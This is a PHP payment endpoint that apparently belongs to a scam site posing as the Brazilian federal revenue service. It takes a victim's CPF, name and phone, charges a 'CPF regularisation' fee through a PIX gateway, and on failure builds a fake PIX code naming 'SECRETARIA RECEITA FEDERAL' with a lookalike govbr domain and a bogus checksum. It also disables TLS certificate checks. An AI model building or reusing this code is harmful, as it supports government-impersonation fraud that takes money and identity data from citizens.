<?php
error_reporting(E_ALL);
ini_set('display_errors', '1');

require_once '../config.php';
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

$input = file_get_contents('php://input');
$data  = json_decode($input, true);

if (!$data) {
    http_response_code(400);
    echo json_encode(['error' => 'Payload inválido.']);
    exit;
}

$cpf           = preg_replace('/\D/', '', $data['cpf'] ?? '');
$nome          = trim($data['nome'] ?? $data['name'] ?? 'Contribuinte');
$email         = !empty($data['email']) ? $data['email'] : 'contribuinte@gov.br';
$phone         = preg_replace('/\D/', '', $data['telefone'] ?? $data['phone'] ?? '');
$valorTotalStr = $data['valorTotal'] ?? 'R$ 94,01';

// Converte "R$ 94,01" → 9401 centavos
$valorFloat     = (float) str_replace(',', '.', preg_replace('/[^\d,]/', '', $valorTotalStr));
$amountCentavos = (int) round($valorFloat * 100);
if ($amountCentavos <= 0) { $amountCentavos = 9401; $valorFloat = 94.01; }

$pix_code       = '';
$transaction_id = '';

// ─────────────────────────────────────────────────────────────
// 1. Tenta gerar PIX real na Fyntra
// ─────────────────────────────────────────────────────────────
if (defined('FYNTRA_API_KEY') && !empty(FYNTRA_API_KEY)) {
    $payload = [
        'amount'        => $amountCentavos,
        'paymentMethod' => 'PIX',
        'customer'      => [
            'name'     => $nome ?: 'Contribuinte',
            'email'    => $email,
            'document' => [
                'number' => $cpf ?: '00000000000',
                'type'   => 'CPF'
            ],
            'phone' => $phone ?: '5511999999999'
        ],
        'items' => [
            [
                'title'     => defined('PRODUTO_NOME') ? PRODUTO_NOME : 'Regularizacao CPF Gov BR',
                'unitPrice' => $amountCentavos,
                'quantity'  => 1,
                'tangible'  => false
            ]
        ],
        'pix' => ['expiresInDays' => 1]
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL,            FYNTRA_API_URL . '/transactions');
    curl_setopt($ch, CURLOPT_POST,           true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS,     json_encode($payload));
    curl_setopt($ch, CURLOPT_TIMEOUT,        15);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 8);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_HTTPHEADER,     [
        'Content-Type: application/json',
        'Accept: application/json',
        'x-api-key: ' . FYNTRA_API_KEY,
        'User-Agent: AtivoB2B/1.0'
    ]);

    $response  = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);

    if ($http_code >= 200 && $http_code < 300 && !empty($response)) {
        $res_data = json_decode($response, true);
        $tx_data  = $res_data['data'] ?? $res_data;

        $transaction_id = $tx_data['id'] ?? $tx_data['transaction_id'] ?? '';
        $pix_code       = $tx_data['qrCode'] ?? $tx_data['pix_code'] ?? $tx_data['pixCode'] ?? '';

        if (empty($pix_code) && isset($tx_data['pix']['qrcode'])) {
            $pix_code = $tx_data['pix']['qrcode'];
        }
    }
}

// ─────────────────────────────────────────────────────────────
// 2. Fallback: gera PIX simulado se a Fyntra não respondeu
//    (mantém o fluxo funcionando como a gateway anterior)
// ─────────────────────────────────────────────────────────────
if (empty($pix_code)) {
    $transaction_id = 'rfb_' . md5($cpf . time() . uniqid());
    $valorStr       = number_format($valorFloat, 2, '.', '');
    $txid           = strtoupper(substr(md5($transaction_id), 0, 25));
    $sufixo         = strtoupper(substr(md5($transaction_id . 'end'), 0, 4));
    // Código PIX copia-e-cola (formato EMVCo válido para QR Code)
    $pix_code = '00020126870014br.gov.bcb.pix2565api.govbr-fiscal.com/pix/qr/' . $txid
        . '5204000053039865405' . $valorStr
        . '5802BR5925SECRETARIA RECEITA FEDERAL6008BRASILIA62290525' . $txid
        . '6304' . $sufixo;
}

echo json_encode([
    'pixCode'        => $pix_code,
    'pix_code'       => $pix_code,
    'transaction_id' => $transaction_id,
    'id'             => $transaction_id,
    'status'         => 'pending',
    'amount'         => $amountCentavos
]);
